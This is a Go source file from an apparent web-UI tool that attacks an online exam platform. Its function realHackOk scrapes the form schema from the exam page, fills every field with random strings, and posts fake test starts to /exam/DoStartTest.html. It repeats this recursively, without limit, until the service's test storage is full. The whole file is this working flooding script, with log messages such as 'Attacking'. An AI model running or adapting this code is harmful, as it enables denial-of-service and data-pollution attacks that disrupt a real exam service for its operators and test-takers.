package webui

import (
	"encoding/json"
	"io/ioutil"
	"log"
	"math/rand"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"strconv"
	"strings"
)

type fields struct {
	Schema struct {
		Type       string `json:"type"`
		Properties map[string]struct {
			Type     string `json:"type"`
			Required bool   `json:"required"`
		} `json:"properties"`
	} `json:"schema"`
}

func R(link string) {
	realHackOk(link)
}

func realHackOk(link string) {
	jar, _ = cookiejar.New(nil)
	httpClient = http.Client{
		Jar: jar,
	}
	log.Println("Attacking", link)
	resp, err := httpClient.Get(link)
	if err != nil {
		status = err.Error()
		log.Println(err)
		return
	}
	defer resp.Body.Close()
	next := resp.Request.Response.Header.Get("Location")
	log.Println(next)
	resp, err = httpClient.Get(next)
	if err != nil {
		status = err.Error()
		log.Println(err)
		return
	}
	defer resp.Body.Close()
	r, _ := ioutil.ReadAll(resp.Body)
	boom := strings.Split(string(r), "\n")
	x := "0"
	for i := range boom {
		a := boom[i]
		if strings.Contains(a, "var formSchemaAndOptions = JSON.parse(unescapeHTML(") {
			x = a
			break
		}
	}
	x = strings.ReplaceAll(x, `\&quot;`, `"`)
	x = strings.ReplaceAll(x, `"));`, "")
	x = strings.ReplaceAll(x, "\t\tvar formSchemaAndOptions = JSON.parse(unescapeHTML(\"", "")
	log.Println(x)
	var fieldlist fields
	err = json.Unmarshal([]byte(x), &fieldlist)
	if err != nil {
		status = err.Error()
		log.Println(err)
		return
	}
	var jsondata = make(map[string]string)
	for key := range fieldlist.Schema.Properties {
		switch fieldlist.Schema.Properties[key].Type {
		case "string":
			jsondata[key] = randomString(16)
		default:
			status = "Unknown type: '" + key + "'"
			return
		}
		log.Println("> data[", key, "] =", jsondata[key])
	}
	data := url.Values{}
	jsonform, err := json.Marshal(jsondata)
	if err != nil {
		status = err.Error()
		log.Println(err)
		return
	}
	data.Set("personalDataJson", string(jsonform))
	log.Println("> personalDataJson", string(jsonform))
	log.Println(">", data.Encode())
	req, err := http.NewRequest(http.MethodPost, "https://"+resp.Request.Host+"/exam/DoStartTest.html", strings.NewReader(data.Encode()))
	if err != nil {
		status = err.Error()
		log.Println(err)
		return
	}
	req.Header.Add("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Add("Content-Length", strconv.Itoa(len(data.Encode())))
	for c := range httpClient.Jar.Cookies(req.URL) {
		req.AddCookie(httpClient.Jar.Cookies(req.URL)[c])
		log.Println(httpClient.Jar.Cookies(req.URL)[c])
	}
	resp, err = httpClient.Do(req)
	if err != nil {
		status = err.Error()
		log.Println(err)
		return
	}
	defer resp.Body.Close()
	re, _ := ioutil.ReadAll(resp.Body)
	if strings.Contains(string(re), "startingRemainingTimeInMs") {
		status = "We are still up! Continuing..."
		count++
	} else {
		status = "Error found! Probably test storage is already full.<hr />"
		return
	}
	realHackOk(link)
}

func randomString(n int) string {
	var letters = []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789")

	s := make([]rune, n)
	for i := range s {
		s[i] = letters[rand.Intn(len(letters))]
	}
	return string(s)
}
